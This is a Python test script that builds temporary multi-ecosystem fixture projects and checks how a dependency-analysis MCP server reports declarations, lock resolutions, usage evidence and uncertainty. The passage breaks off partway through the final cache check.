"""Exercise real MCP contracts used by the skill; this does not grade agent prose.

Run with a depcheck[agent] environment from the repository root:
    python skills/check-dependencies/evals/run_live.py --output .tmp/depcheck-live.json
All fixtures are temporary, and every scan is offline.
"""

import argparse
import asyncio
import json
import sys
from pathlib import Path
from tempfile import TemporaryDirectory

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client


def check(condition: bool, message: str) -> None:
    if not condition:
        raise RuntimeError(message)


async def exercise(root: Path, calls: list[dict], passed: list[str]) -> None:
    fixtures = {
        "python": {
            "requirements.txt": "requests==2.31.0\n",
            "app.py": "import requests\n",
        },
        "python-unknown-marker": {
            ".depcheck.toml": 'python-version="3.12"\n',
            "requirements.txt": 'demo==1; "gui" in extras\n',
            "app.py": "import demo\n",
        },
        "unicode-columns": {
            "requirements.txt": "PyYAML==6.0.2\n",
            "app.py": '标签="雪😀"; import yaml\n',
            "book.ipynb": json.dumps(
                {
                    "cells": [
                        {"cell_type": "code", "source": '标签="雪😀"; import yaml\n'}
                    ]
                }
            ),
        },
        "python-groups": {
            "pyproject.toml": '[project]\nname="demo"\nversion="1"\n[dependency-groups]\nBase_Test=["pyyaml==6.0.2"]\nci=[{include-group="base.test"},{include-group="BASE-TEST"}]\n',
            "test_app.py": "import yaml\n",
        },
        "python-uv-legacy": {
            "pyproject.toml": '[project]\nname="demo"\nversion="1"\n[tool.uv]\ndev-dependencies=["pyyaml==6.0.2"]\n[dependency-groups]\nDEV=["pytest==8.3.0"]\nci=[{include-group="dev"},{include-group="DEV"}]\n',
            "test_app.py": "import yaml\n",
        },
        "python-uv-forks": {
            "pyproject.toml": '[project]\nname="demo"\nversion="1"\ndependencies=["requests>=2"]\n',
            "uv.lock": 'version=1\nrequires-python=">=3.9"\nresolution-markers=["sys_platform == \'win32\'", "sys_platform != \'win32\'"]\n[[package]]\nname="requests"\nversion="2.31.0"\nsource={registry="https://pypi.org/simple"}\nresolution-markers=["sys_platform == \'win32\'"]\n[[package]]\nname="requests"\nversion="2.32.0"\nsource={registry="https://pypi.org/simple"}\nresolution-markers=["sys_platform != \'win32\'"]\n',
            "app.py": "import requests\n",
        },
        "cmake-package-config": {
            "CMakeLists.txt": "project(demo)\nfind_package(absl)\n",
            "ExportConfig.cmake.in": "@PACKAGE_INIT@\ninclude(CMakeFindDependencyMacro)\nif(@HAS_THREADS@)\n  find_dependency(Threads)\nendif()\nfind_dependency(absl @VERSION@ CONFIG)\n",
        },
        "bazel-module": {
            "MODULE.bazel": 'module(name="demo")\nbazel_dep(name="abseil-cpp",version="20260526.0",repo_name="absl")\nbazel_dep(name="rules_python",version="2.2.0",dev_dependency=True)\nlocal_path_override(module_name="abseil-cpp",path="../private")\n',
        },
        "python-group-selection": {
            "pyproject.toml": '[project]\nname="demo"\nversion="1"\n[dependency-groups]\nleft=["pyyaml==6.0.1"]\nright=["pyyaml==6.0.2"]\n[tool.uv]\nconflicts=[[{group="left"},{group="right"}]]\n',
            "test_app.py": "import yaml\n",
        },
        "cpp-preprocessor": {
            "conanfile.txt": "[test_requires]\ngtest/1.17.0\n",
            "main.cc": "/*\n#include <fmt/comment.h>\n*/\n#if ENABLE_TESTS\n  #include <gtest/gtest.h>\n#endif\n#include HEADER\n",
        },
        "gradle-catalog": {
            "gradle/libs.versions.toml": '[versions]\nshared="1.4"\n[libraries]\ncore-lib={module="example:core",version.ref="shared"}\n[bundles]\nmain=["core-lib"]\n[plugins]\ncompile={id="example.compile",version="2"}\n',
            "build.gradle.kts": "dependencies { implementation(libs.core.lib) }\n",
        },
        "yarn-inventory": {
            "yarn.lock": '__metadata: {version: 10}\n"tool@npm:^1, tool@npm:~1": {version: 1.0.0-alpha.1, resolution: "tool@npm:1.0.0-alpha.1", conditions: os=linux}\n"local@workspace:*": {version: 0.0.0-use.local, resolution: "local@workspace:packages/local"}\n',
        },
        "pipenv-private": {
            "Pipfile": '[[source]]\nname="private"\nurl="https://private.example/simple"\nverify_ssl=true\n\n[packages]\nrequests={version="==2.31.0",index="private"}\n',
            "app.py": "import requests\n",
        },
        "conan-contexts": {
            "conanfile.txt": "[requires]\nfmt/[>=1.0 <3.0]\n",
            "conan.lock": '{\n "version":"0.5",\n "requires":[\n  "fmt/2.0#one%123",\n  "fmt/1.0#two%124"\n ],\n "build_requires":["fmt/2.0#one%123"],\n "python_requires":["recipe/1.0#three"]\n}\n',
            "main.cpp": "#include <fmt/core.h>\n",
        },
        "maven-plugin": {
            "pom.xml": "<project>\n<groupId>example</groupId><artifactId>app</artifactId><version>1</version>\n<build><pluginManagement><plugins>\n<plugin><artifactId>maven-compiler-plugin</artifactId><version>3.13.0</version></plugin>\n</plugins></pluginManagement><plugins>\n<plugin><artifactId>maven-compiler-plugin</artifactId><executions><execution><id>compile-it</id><phase>compile</phase><goals><goal>compile</goal></goals></execution></executions></plugin>\n</plugins></build></project>\n",
        },
        "go-checksum": {
            "go.mod": "module example.com/app\n\nrequire example.com/dep v1.0.0\n",
            "go.sum": "example.com/dep v1.0.0/go.mod h1:"
            + "A" * 43
            + "=\n"
            + "example.com/dep v1.4.0 h1:"
            + "A" * 43
            + "=\n"
            + "example.com/old v0.9.0 h1:"
            + "A" * 43
            + "=\n",
            "main.go": 'package main\nimport "example.com/dep"\n',
        },
        "go-tools": {
            "go.mod": "module example.com/app\ngo 1.24.0\nrequire example.com/tool v1.0.0 // indirect\ntool (\n\texample.com/tool/cmd/lint\n\texample.com/tool/cmd/lint\n)\n",
        },
        "gradle-variants": {
            "build.gradle.kts": 'val docs = """\nimplementation("ghost:docs:9.0")\n"""\ndependencies {\n implementation(\n  "org.slf4j:slf4j-api:latest.release"\n )\n}\n',
            "gradle.lockfile": "org.slf4j:slf4j-api:1.7.36=compileClasspath\norg.slf4j:slf4j-api:2.0.16=testRuntimeClasspath\n",
        },
        "vcpkg-registry": {
            "vcpkg.json": '{\n "dependencies":[{"name":"fmt","platform":"windows","version>=":"10.0","features":[{"name":"unicode","platform":"linux"}]}],\n "default-features":[{"name":"tests","platform":"windows"}],\n "features":{"tests":{"description":"Tests","dependencies":["gtest"]},"debugging":{"description":"Debugging","supports":"linux","dependencies":["gtest"]}}\n}\n',
            "vcpkg-lock.json": '{"https://example.test/registry":{"HEAD":"abc"}}',
            "main.cpp": "#include <fmt/core.h>\n",
        },
        "preview": {
            "pyproject.toml": '[project]\nname="app"\nversion="1"\n'
            'dependencies=["requests==2.31.0"]\n'
        },
        "preview-ambiguous": {
            "pyproject.toml": '[project]\ndependencies=["requests==1"]\n[project.optional-dependencies]\ntest=["requests==1"]\n'
        },
        "preview-url": {
            "pyproject.toml": '[project]\ndependencies=["requests @ https://example.org/r.whl"]\n'
        },
        "npm": {
            "package.json": '{"dependencies":{"lodash":"^4.17.0"}}',
            "app.js": "import lodash from 'lodash';\n",
        },
        "lock-ambiguous": {
            "package.json": '{"dependencies":{"tool":"^1.0.0"}}',
            "app.js": 'import "tool";\n',
            "package-lock.json": '{"packages":{"node_modules/tool":{"version":"1.0.0"}}}',
            "yarn.lock": "# yarn lock\n",
        },
        "frontend": {
            "package.json": '{"dependencies":{"font":"1.0.0","theme":"1.0.0","other":"1.0.0"},"devDependencies":{"vite":"6.0.0"}}',
            "vite.config.js": 'import {defineConfig} from "vite";\nexport default defineConfig({});\n',
            "Page.astro": '---\nimport "font/style.css";\n---\n<div>Hello</div>\n',
            "global.css": '@import url("theme/base.css");\n',
        },
        "frontend-uncertain": {
            "package.json": '{"devDependencies":{"theme":"1.0.0"}}',
            "global.css": '@import "theme/base.css";\n',
        },
        "origins": {
            "package.json": '{"dependencies":{"parent":"1.0.0"}}',
            "package-lock.json": '{"lockfileVersion":3,"packages":{"":{"dependencies":{"parent":"1.0.0"}},"node_modules/parent":{"version":"1.0.0","dependencies":{"child":"2.0.0"}},"node_modules/child":{"version":"2.0.0"}}}',
        },
        "component-regions": {
            "package.json": '{"dependencies":{"known":"1.0.0"}}',
            "Page.vue": '<script lang="ts">import "known";</script><template>{{ value }}</template>',
            "Page.svelte": '<script>import "known";</script><div>{value}</div>',
        },
        "uv-workspace": {
            "pyproject.toml": '[tool.uv.workspace]\nmembers=["member"]\n',
            "member/pyproject.toml": '[project]\nname="member"\nversion="1"\ndependencies=["requests==2.31.0"]\n',
            "member/app.py": "import requests\n",
        },
        "evidence-pages": {
            "package.json": '{"dependencies":{"lib":"1.0.0"}}',
            "app.js": 'import "lib";\n' * 65,
        },
        "python-source": {
            "pyproject.toml": '[project]\nname="app"\nversion="1"\ndependencies=["requests==2.31.0"]\n',
            "uv.lock": 'version=1\n[[package]]\nname="requests"\nversion="2.31.0"\nsource={editable="vendor/requests"}\n',
        },
        "pages": {
            "requirements.txt": "".join(f"package-{i:03d}==1.0\n" for i in range(65))
        },
        "ambiguous": {
            "one/package.json": '{"dependencies":{"shared":"1.0"}}',
            "two/package.json": '{"dependencies":{"shared":"2.0"}}',
        },
        "dynamic": {
            "requirements.txt": "requests==2.31.0\n",
            "app.py": "import importlib\nimportlib.import_module(name)\n",
        },
        "alias": {
            "package.json": '{"dependencies":{"lodash":"4.17.21"}}',
            "app.js": "import lodash from '#lodash';\n",
        },
        "alias-known": {
            "package.json": '{"dependencies":{"lodash":"4.17.21","other":"1.0.0"},"imports":{"#alias":"lodash/fp"}}',
            "app.js": "import a from '#alias';\n",
        },
        "tool": {
            "requirements.txt": "ruff==0.11.0\n",
            ".depcheck.toml": '[[tool-usage]]\necosystem="PyPI"\n'
            'project-id="pypi:python:."\npackage="ruff"\nscope="test"\nreason="CI lint"\n',
        },
        "command": {
            "package.json": '{"devDependencies":{"vitest":"1.0.0"},"scripts":{"test":"vitest run"}}',
        },
        "cargo": {
            "Cargo.toml": '[package]\nname="demo"\nversion="0.1.0"\n[dependencies]\nfoo="1"\n',
            "Cargo.lock": 'version=4\n[[package]]\nname="foo"\nversion="1.2.3"\nsource="registry+https://github.com/rust-lang/crates.io-index"\n',
            "src/lib.rs": 'use foo::Thing;\nconst DOC: &str = "foo::example";\n',
        },
        "cargo-legacy": {
            "Cargo.toml": '[package]\nname="demo"\nversion="0.1.0"\nedition="2021"\n'
            '[dev-dependencies]\nfoo="1"\n[dev_dependencies]\nfoo="2"\n'
            '[target."cfg(unix)".build_dependencies]\ncc="1"\n',
            "new/Cargo.toml": '[package]\nname="new"\nversion="0.1.0"\nedition="2024"\n'
            '[dev_dependencies]\nbar="1"\n',
        },
        "cmake": {
            "CMakeLists.txt": "include(FetchContent)\n",
            "deps.cmake": "FetchContent_Declare(GoogleTest URL https://example.test/source.zip)\nFetchContent_MakeAvailable(googletest)\n",
        },
        "cmake-script": {
            "fetch.cmake": 'FetchContent_Declare(Shared URL https://example.test/source.zip)\nCPMAddPackage("gh:fmtlib/fmt#11.0.0")\n',
            "app/CMakeLists.txt": "find_package(Shared CONFIG REQUIRED)\n",
        },
        "uncovered": {"composer.json": '{"require":{"vendor/package":"1"}}'},
        "components": {
            "a/pyproject.toml": '[project]\ndependencies=["PyYAML==6.0.2"]\n',
            "a/app.py": "import sklearn\n",
            "b/pyproject.toml": '[project]\ndependencies=["scikit-learn==1.5.0"]\n',
            "b/app.py": "import yaml\n",
        },
        "configuration": {
            "package.json": '{"devDependencies":{"@types/node":"22.0.0"}}',
            "tsconfig.json": '{"compilerOptions":{"types":["node"]}}',
            "main.ts": "console.log(process.version);\n",
        },
        "named-components": {
            "a/pyproject.toml": '[project]\nname="a"\nversion="1.0"\ndependencies=["PyYAML==6.0.2"]\n',
            "a/main.py": "import yaml\n",
            "b/pyproject.toml": '[project]\nname="b"\nversion="1.0"\ndependencies=["PyYAML==6.0.2"]\n',
            "b/main.py": "import yaml\n",
        },
    }
    for folder, files in fixtures.items():
        for name, content in files.items():
            path = root / folder / name
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(content, encoding="utf-8")

    params = StdioServerParameters(
        command=sys.executable,
        args=["-m", "depcheck.agent.mcp_server", "--allow-root", str(root)],
    )
    async with stdio_client(params) as (read, write):
        async with ClientSession(read, write) as session:
            await session.initialize()
            definitions = await session.list_tools()
            for tool in definitions.tools:
                check(
                    tool.annotations is not None, f"Missing annotations for {tool.name}"
                )
                check(
                    tool.annotations.openWorldHint
                    is (tool.name == "verify_registry_package"),
                    "Unexpected network annotation",
                )
                check(
                    tool.annotations.readOnlyHint
                    == (tool.name not in {"index_repository", "scan_repository"}),
                    f"Incorrect side effects for {tool.name}",
                )

            async def call(name: str, fixture: str, **arguments) -> dict:
                arguments = {"project_root": str(root / fixture), **arguments}
                result = await session.call_tool(name, arguments)
                check(not result.isError, f"{name}: {result.content}")
                payload = json.loads(result.content[0].text)
                calls.append({"name": name, "arguments": arguments, "result": payload})
                return payload

            scan = await call("scan_repository", "python")
            check(
                not scan["summary"]["complete"], "Offline summary must stay incomplete"
            )
            check(
                scan["capabilities"]["security"]["state"] == "skipped", "Security ran"
            )
            check(
                scan["capabilities"]["dependency_hygiene"]["state"] == "complete",
                "Hygiene incomplete",
            )
            check(
                scan["context"]["complete"] and not scan["context"]["stale"],
                "Stale index",
            )
            passed.append("offline-freshness-vs-security")

            marker_scan = await call("scan_repository", "python-unknown-marker")
            marker_cache = root / "python-unknown-marker/.depcheck/index.sqlite3"
            marker_before = marker_cache.read_bytes(), marker_cache.stat().st_mtime_ns
            marker_query = await call(
                "explain_dependency",
                "python-unknown-marker",
                package="demo",
                ecosystem="PyPI",
                project_id="pypi:python:.",
            )
            check(
                any(
                    d["code"] == "manifest.marker-evaluation-unknown"
                    for d in marker_scan["diagnostics"]
                )
                and marker_scan["capabilities"]["dependency_hygiene"]["state"]
                == "incomplete"
                and len(marker_query["declarations"]) == 1
                and marker_query["declarations"][0]["marker"] == '"gui" in extras'
                and not marker_query["evidence_complete"]
                and not marker_query["findings"]
                and marker_before
                == (marker_cache.read_bytes(), marker_cache.stat().st_mtime_ns),
                "Unknown Python marker lost its declaration or uncertainty, or changed the query cache",
            )
            passed.append("unknown-python-marker-survives-read-only-index-query")

            await call("scan_repository", "unicode-columns")
            unicode_cache = root / "unicode-columns/.depcheck/index.sqlite3"
            unicode_before = (
                unicode_cache.read_bytes(),
                unicode_cache.stat().st_mtime_ns,
            )
            unicode_usage = await call(
                "explain_dependency",
                "unicode-columns",
                package="pyyaml",
                ecosystem="PyPI",
                project_id="pypi:python:.",
            )
            check(
                len(unicode_usage["usages"]) == 2
                and {u["location"]["path"] for u in unicode_usage["usages"]}
                == {"app.py", "book.ipynb"}
                and all(
                    u["location"]["line"] == 1 and u["location"]["column"] == 10
                    for u in unicode_usage["usages"]
                )
                and unicode_before
                == (unicode_cache.read_bytes(), unicode_cache.stat().st_mtime_ns),
                "Unicode Python columns changed units or cached queries modified the index",
            )
            passed.append("unicode-columns-across-python-and-notebook-sources")

            await call("scan_repository", "python-groups")
            groups = await call(
                "explain_dependency",
                "python-groups",
                package="pyyaml",
                ecosystem="PyPI",
                project_id="pypi:python:.",
            )
            groups_impact = await call(
                "dependency_impact",
                "python-groups",
                package="pyyaml",
                ecosystem="PyPI",
                project_id="pypi:python:.",
            )
            check(
                len(groups["declarations"]) == 3
                and [d["metadata"]["group"] for d in groups["declarations"]].count(
                    "dev:ci"
                )
                == 2
                and all(d["location"]["line"] == 5 for d in groups["declarations"])
                and not any(
                    f["code"] == "declaration.duplicate" for f in groups["findings"]
                ),
                "PEP735 include normalization, multiplicity or physical source identity was lost",
            )
            check(
                groups["evidence_page"]["counts"]["declarations"] == 3
                and groups_impact["usage_count"] == 1,
                "PEP735 indexing or impact lost repeated declarations and source use",
            )
            passed.append("pep735-normalized-includes-retain-multiplicity")

            await call("scan_repository", "python-uv-legacy")
            legacy = await call(
                "explain_dependency",
                "python-uv-legacy",
                package="pyyaml",
                ecosystem="PyPI",
                project_id="pypi:python:.",
            )
            modern = await call(
                "explain_dependency",
                "python-uv-legacy",
                package="pytest",
                ecosystem="PyPI",
                project_id="pypi:python:.",
            )
            check(
                len(legacy["declarations"]) == 1
                and legacy["declarations"][0]["metadata"]["group"] == "dev:DEV"
                and legacy["declarations"][0]["location"]["line"] == 5
                and legacy["declarations"][0]["scope"] == "development"
                and not legacy["findings"],
                "Legacy uv declarations were lost, copied into includes or assigned runtime scope",
            )
            check(
                [d["metadata"]["group"] for d in modern["declarations"]]
                == ["dev:DEV", "dev:ci", "dev:ci"]
                and all(d["location"]["line"] == 7 for d in modern["declarations"]),
                "Standard includes lost their counts or original locations when uv legacy dev was appended",
            )
            passed.append("uv-legacy-dev-appended-after-standard-includes")

            template_scan = await call("scan_repository", "cmake-package-config")
            exported = await call(
                "explain_dependency",
                "cmake-package-config",
                package="absl",
                ecosystem="CMake",
                project_id="cmake:cmake:.",
            )
            threads = await call(
                "explain_dependency",
                "cmake-package-config",
                package="Threads",
                ecosystem="CMake",
                project_id="cmake:cmake:.",
            )
            check(
                len(exported["declarations"]) == 2
                and exported["resolved_version"] is None
                and not exported["evidence_complete"]
                and threads["declarations"][0]["location"]["line"] == 4,
                "CMake package-config assertions became installed versions or lost locations",
            )
            template_declaration = next(
                d for d in exported["declarations"] if d["metadata"].get("template")
            )
            check(
                template_declaration["metadata"]["mechanism"] == "find_dependency"
                and template_declaration["metadata"]["dynamic_arguments"] == [0]
                and template_declaration["metadata"]["activation"] == "unknown"
                and template_declaration["location"]["path"] == "ExportConfig.cmake.in"
                and any(
                    d["code"] == "manifest.unsupported-cmake-template-expansion"
                    for d in template_scan["diagnostics"]
                ),
                "Template substitutions lost their qualification or declaration provenance",
            )
            passed.append("cmake-package-config-literals-retain-template-uncertainty")

            bazel_scan = await call("scan_repository", "bazel-module")
            bazel = await call(
                "explain_dependency",
                "bazel-module",
                package="abseil-cpp",
                ecosystem="Bazel",
                project_id="bazel:bzlmod:.",
            )
            bazel_dev = await call(
                "explain_dependency",
                "bazel-module",
                package="rules_python",
                ecosystem="Bazel",
                project_id="bazel:bzlmod:.",
            )
            bazel_impact = await call(
                "dependency_impact",
                "bazel-module",
                package="abseil-cpp",
                ecosystem="Bazel",
                project_id="bazel:bzlmod:.",
            )
            check(
                bazel_scan["inventory"]["declaration_count"] == 2
                and bazel["resolved_versions"] == []
                and bazel["purl"] is None
                and not bazel["evidence_complete"]
                and bazel["declarations"][0]["metadata"]["arguments"]["repo_name"]
                == "absl"
                and bazel["declarations"][0]["location"]["line"] == 2,
                "Bzlmod declaration identity/alias/position lost or request became selected version",
            )
            check(
                bazel_dev["declarations"][0]["scope"] == "development"
                and bazel_dev["declarations"][0]["kind"] == "conditional"
                and bazel_dev["declarations"][0]["metadata"]["activation"] == "unknown"
                and bazel_impact["usage_count"] == 0
                and not bazel_impact["evidence_complete"]
                and any(
                    d["code"] == "manifest.bazel-uncollected"
                    for d in bazel_scan["diagnostics"]
                ),
                "Bzlmod dev/override conditions became active usage or removal evidence",
            )
            passed.append("bzlmod-requests-and-dev-conditions-are-not-installed-state")

            selection_scan = await call("scan_repository", "python-group-selection")
            selection = await call(
                "explain_dependency",
                "python-group-selection",
                package="pyyaml",
                ecosystem="PyPI",
                project_id="pypi:python:.",
            )
            selection_impact = await call(
                "dependency_impact",
                "python-group-selection",
                package="pyyaml",
                ecosystem="PyPI",
                project_id="pypi:python:.",
            )
            check(
                any(
                    d["code"] == "analysis.python-group-selection-unknown"
                    for d in selection_scan["diagnostics"]
                )
                and not any(
                    f["code"] == "declaration.conflict"
                    for f in selection_scan["findings"]
                ),
                "Independent Python development groups became a definite active conflict",
            )
            check(
                not selection["evidence_complete"]
                and selection["usage_complete"]
                and not selection["findings"]
                and not selection_impact["evidence_complete"],
                "Analysis-stage uncertainty disappeared from cached dependency queries",
            )
            passed.append("python-group-selection-uncertainty-survives-indexing")

            go_scan = await call("scan_repository", "go-checksum")
            go_dep = await call(
                "explain_dependency",
                "go-checksum",
                package="example.com/dep",
                ecosystem="Go",
            )
            go_old = await call(
                "dependency_impact",
                "go-checksum",
                package="example.com/old",
                ecosystem="Go",
            )
            check(
                go_scan["capabilities"]["dependency_hygiene"]["state"] == "incomplete"
                and go_dep["resolved_versions"] == []
                and not go_dep["evidence_complete"]
                and len(go_dep["declarations"]) == 3,
                "Go minimum/checksum assertions became selected versions",
            )
            check(
                [d["kind"] for d in go_dep["declarations"]]
                == ["direct", "checksum", "checksum"]
                and go_dep["declarations"][0]["constraint"]["scheme"] == "go-minimum"
                and go_dep["declarations"][1]["metadata"]["checksum_kind"] == "go.mod"
                and go_dep["declarations"][2]["metadata"]["integrity_verified"] is False
                and go_old["usage_count"] == 0
                and not go_old["evidence_complete"],
                "Go artifact context or removal uncertainty was lost",
            )
            passed.append("go-checksums-do-not-select-build-versions")

            go_snapshots = root / "go-checksum/.tmp"
            go_snapshots.mkdir(exist_ok=True)
            (go_snapshots / "before.json").write_text(json.dumps(go_scan))
            go_sum = root / "go-checksum/go.sum"
            go_sum.write_text(
                go_sum.read_text().replace(
                    "v1.4.0 h1:" + "A" * 43 + "=", "v1.4.0 h1:" + "B" * 42 + "A="
                )
            )
            go_after = await call("scan_repository", "go-checksum")
            (go_snapshots / "after.json").write_text(json.dumps(go_after))
            go_cache = root / "go-checksum/.depcheck/index.sqlite3"
            go_cache_before = (go_cache.read_bytes(), go_cache.stat().st_mtime_ns)
            go_comparison = await call(
                "compare_dependency_snapshots",
                "go-checksum",
                before_file=".tmp/before.json",
                after_file=".tmp/after.json",
            )
            check(
                go_comparison["comparable"]
                and go_comparison["counts"]["declarations_added"] == 1
                and go_comparison["counts"]["declarations_removed"] == 1
                and not go_comparison["remediation_verified"]
                and go_comparison["changes"]["declarations_added"][0]["metadata"][
                    "integrity_verified"
                ]
                is False
                and go_cache_before
                == (go_cache.read_bytes(), go_cache.stat().st_mtime_ns),
                "Checksum-only change was hidden, verified or mutated the cache",
            )
            passed.append("checksum-only-snapshot-change-preserves-uncertainty")

            go_tools_scan = await call("scan_repository", "go-tools")
            go_tool = await call(
                "explain_dependency",
                "go-tools",
                package="example.com/tool",
                ecosystem="Go",
            )
            go_tool_impact = await call(
                "dependency_impact",
                "go-tools",
                package="example.com/tool",
                ecosystem="Go",
            )
            check(
                go_tools_scan["inventory"]["usage_count"] == 2
                and go_tool["resolved_versions"] == []
                and go_tool["imports"] == []
                and go_tool["findings"] == []
                and go_tool["declarations"][0]["metadata"]["indirect"] is True
                and not go_tool["evidence_complete"],
                "Go tool configuration became source imports, missing dependency or selected versions",
            )
            check(
                [u["location"]["line"] for u in go_tool["usages"]] == [5, 6]
                and all(
                    u["kind"] == "configuration" and u["scope"] == "build"
                    for u in go_tool["usages"]
                )
                and go_tool_impact["files"] == ["go.mod"]
                and go_tool_impact["usage_count"] == 2,
                "Go tool context, repeats or declaration positions were lost",
            )
            passed.append("go-tool-configuration-is-not-execution")

            gradle_scan = await call("scan_repository", "gradle-variants")
            gradle = await call(
                "explain_dependency",
                "gradle-variants",
                package="org.slf4j:slf4j-api",
                ecosystem="Maven",
                project_id="maven:gradle:.",
            )
            gradle_impact = await call(
                "dependency_impact",
                "gradle-variants",
                package="org.slf4j:slf4j-api",
                ecosystem="Maven",
                project_id="maven:gradle:.",
            )
            check(
                gradle_scan["inventory"]["declaration_count"] == 1
                and gradle["resolved_versions"] == ["1.7.36", "2.0.16"]
                and gradle["resolved_version"] is None
                and not gradle["evidence_complete"]
                and gradle["declarations"][0]["kind"] == "conditional",
                "Gradle comments/requests became active versions or lock variants collapsed",
            )
            check(
                len(gradle["resolutions"]) == 2
                and {
                    tuple(r["origin"]["configurations"]) for r in gradle["resolutions"]
                }
                == {("compileClasspath",), ("testRuntimeClasspath",)}
                and len({r["instance"] for r in gradle["resolutions"]}) == 2
                and gradle_impact["usage_count"] == 0
                and not gradle_impact["evidence_complete"],
                "Gradle variant provenance or removal uncertainty was lost",
            )
            passed.append("gradle-literal-and-lock-variants-are-qualified")

            await call("scan_repository", "gradle-catalog")
            catalog_query = await call(
                "query_dependencies",
                "gradle-catalog",
                query="core-lib",
                ecosystem="Maven",
                project_id="maven:gradle-catalog:gradle",
            )
            catalog = await call(
                "explain_dependency",
                "gradle-catalog",
                package="example:core",
                ecosystem="Maven",
                project_id="maven:gradle-catalog:gradle",
            )
            catalog_impact = await call(
                "dependency_impact",
                "gradle-catalog",
                package="example:core",
                ecosystem="Maven",
                project_id="maven:gradle-catalog:gradle",
            )
            definition = catalog["declarations"][0]
            check(
                catalog_query["count"] == 1
                and definition["kind"] == "conditional"
                and definition["scope"] == "unknown"
                and definition["location"]["line"] == 4
                and definition["metadata"]["version_source"]["line"] == 2
                and definition["metadata"]["bundles"][0]["alias"] == "main",
                "Catalog alias search, provenance or bundle membership was lost",
            )
            check(
                catalog["resolved_versions"] == []
                and not catalog["usages"]
                and not catalog["findings"]
                and not catalog["usage_complete"]
                and not catalog["evidence_complete"]
                and catalog_impact["usage_count"] == 0
                and not catalog_impact["evidence_complete"],
                "Catalog definitions became active/selected packages or justified removal",
            )
            passed.append("gradle-catalog-definition-binding-is-unknown")

            await call("scan_repository", "yarn-inventory")
            yarn_cache = root / "yarn-inventory/.depcheck/index.sqlite3"
            yarn_before = yarn_cache.read_bytes(), yarn_cache.stat().st_mtime_ns
            yarn_query = await call(
                "query_dependencies",
                "yarn-inventory",
                project_id="npm:yarn-lock:.",
            )
            yarn = await call(
                "explain_dependency",
                "yarn-inventory",
                package="tool",
                ecosystem="npm",
                project_id="npm:yarn-lock:.",
            )
            yarn_impact = await call(
                "dependency_impact",
                "yarn-inventory",
                package="tool",
                ecosystem="npm",
                project_id="npm:yarn-lock:.",
            )
            check(
                yarn_query["count"] == 2
                and len(yarn["declarations"]) == 2
                and yarn["declarations"][0]["location"]["line"] == 2
                and all(
                    d["kind"] == "conditional" and d["scope"] == "unknown"
                    for d in yarn["declarations"]
                )
                and yarn["declarations"][0]["metadata"]["context"]["conditions"]
                == "os=linux",
                "Yarn physical descriptors or conditional context were lost",
            )
            check(
                yarn["resolved_versions"] == []
                and not yarn["usages"]
                and not yarn["findings"]
                and not yarn["evidence_complete"]
                and not yarn["usage_complete"]
                and yarn_impact["usage_count"] == 0
                and not yarn_impact["evidence_complete"]
                and yarn_before
                == (yarn_cache.read_bytes(), yarn_cache.stat().st_mtime_ns),
                "Yarn inventory became an installed application graph or changed the query cache",
            )
            passed.append("yarn-lock-inventory-preserves-unknown-ownership")

            await call("index_repository", "npm")
            cache = root / "npm" / ".depcheck" / "index.sqlite3"
            cache_before = (cache.read_bytes(), cache.stat().st_mtime_ns)
            npm = await call("explain_dependency", "npm", package="lodash")
            impact = await call("dependency_impact", "npm", package="lodash")
            check(
                npm["resolved_versions"] == [], "Range treated as an exact resolution"
            )
            check(
                impact["usage_count"] == 1 and impact["files"] == ["app.js"],
                "Lost usage",
            )
            passed.append("default-npm-index-without-lock")
            await call("index_repository", "evidence-pages")
            lines = []
            evidence_offset = 0
            while evidence_offset is not None:
                page = await call(
                    "explain_dependency",
                    "evidence-pages",
                    package="lib",
                    evidence_limit=20,
                    evidence_offset=evidence_offset,
                )
                check(
                    page["evidence_page"]["counts"]["usages"] == 65,
                    "Evidence count lost full inventory",
                )
                lines.extend(u["location"]["line"] for u in page["usages"])
                evidence_offset = page["evidence_page"]["next_offset"]
            check(
                lines == list(range(1, 66)),
                "Evidence pagination omitted or repeated usages",
            )
            passed.append("bounded-nested-evidence-pagination")
            await call("index_repository", "python-source")
            sourced = await call(
                "explain_dependency", "python-source", package="requests"
            )
            check(
                sourced["purl"] is None
                and not sourced["evidence_complete"]
                and sourced["resolutions"][0]["origin"]["kind"] == "editable",
                "Local Python source became a public registry identity",
            )
            passed.append("python-source-provenance")
            await call("index_repository", "origins")
            origin = await call(
                "explain_dependency",
                "origins",
                package="child",
                origin_limit=1,
                origin_depth=1,
            )
            check(
                origin["origins"]["truncated"] and not origin["origins"]["complete"],
                "Depth limit lost origin uncertainty",
            )
            origin = await call("explain_dependency", "origins", package="child")
            check(
                origin["origins"]["complete"]
                and [n["package"] for n in origin["origins"]["paths"][0]["nodes"]]
                == ["parent", "child"],
                "Qualified origin path lost its direct owner",
            )
            passed.append("bounded-qualified-dependency-origins")
            component = await call("scan_repository", "component-regions")
            check(
                component["capabilities"]["dependency_hygiene"]["state"] == "incomplete"
                and component["inventory"]["usage_count"] == 2,
                "Component regions lost imports or template uncertainty",
            )
            passed.append("vue-svelte-literal-regions")
            workspace = await call("scan_repository", "uv-workspace")
            check(
                any(
                    p["project_id"] == "pypi:python:member"
                    for p in workspace["projects"]
                )
                and any(
                    d["code"] == "resolution.uv-workspace-activation-unknown"
                    for d in workspace["diagnostics"]
                ),
                "uv member ownership lost shared activation uncertainty",
            )
            passed.append("uv-member-ownership-and-activation")
            uv_forks = await call("scan_repository", "python-uv-forks")
            uv_cache = root / "python-uv-forks/.depcheck/index.sqlite3"
            uv_before = uv_cache.read_bytes(), uv_cache.stat().st_mtime_ns
            uv_explanation = await call(
                "explain_dependency", "python-uv-forks", package="requests"
            )
            uv_impact = await call(
                "dependency_impact", "python-uv-forks", package="requests"
            )
            check(
                uv_explanation["resolved_versions"] == ["2.31.0", "2.32.0"]
                and len({r["instance"] for r in uv_explanation["resolutions"]}) == 2
                and all(
                    r["origin"]["lock"]["conditional"]
                    for r in uv_explanation["resolutions"]
                )
                and not uv_explanation["evidence_complete"]
                and uv_impact["usage_count"] == 1
                and any(
                    d["code"] == "resolution.uv-lock-selection-unknown"
                    for d in uv_forks["diagnostics"]
                ),
                "uv lock branches became one active environment or lost their conditions",
            )
            check(
                (uv_cache.read_bytes(), uv_cache.stat().st_mtime_ns) == uv_before,
                "uv fork queries changed the derived index",
            )
            passed.append("uv-lock-branches-retain-unknown-activation")
            check(
                (cache.read_bytes(), cache.stat().st_mtime_ns) == cache_before,
                "Read-only MCP queries changed the index",
